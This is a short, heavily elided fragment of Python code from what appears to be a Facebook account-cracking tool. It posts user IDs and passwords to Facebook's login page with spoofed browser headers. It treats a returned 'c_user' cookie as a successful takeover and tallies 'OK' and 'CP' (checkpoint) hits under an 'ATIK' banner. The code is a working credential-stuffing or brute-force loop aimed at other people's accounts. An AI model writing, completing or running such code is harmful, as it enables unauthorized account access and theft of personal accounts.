...
def freeq(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
               'user-agent': pro}
            lo = session.post('https://www.facebook.com/login/?ref=dbl&fl&login_from_aymh=1',data=log_data,headers=header_freefb).text
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[ATIK 🔥] [%s] \33[1;97m[OK:%s{TANJID2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
